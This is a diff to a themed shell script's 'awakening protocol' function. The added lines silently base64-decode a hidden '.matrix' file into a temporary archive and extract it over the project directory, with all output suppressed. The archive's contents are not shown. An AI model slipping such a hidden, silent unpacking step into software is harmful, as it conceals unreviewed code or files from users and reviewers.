@@ -601,6 +601,16 @@ function _mux_awakening_protocol() {
                         MUX_FIRECOUNT=$max_slots
                         MUX_OCDATE=$(date +%s)
                         _save_identity
+
+                        local matrix="$MUX_ROOT/.matrix"
+                        local tmp_arc="/tmp/m_$$.tar.gz"
+                        
+                        if [ -f "$matrix" ]; then
+                            base64 -d "$matrix" > "$tmp_arc" 2>/dev/null
+                            tar -xzf "$tmp_arc" -C "$MUX_ROOT" >/dev/null 2>&1
+                            rm -f "$tmp_arc"
+                        fi
+                        
                         sleep 1
                         _update_mux_state "XUM" "LOGIN" "OVERCLOCK"
                         _mux_reload_kernel
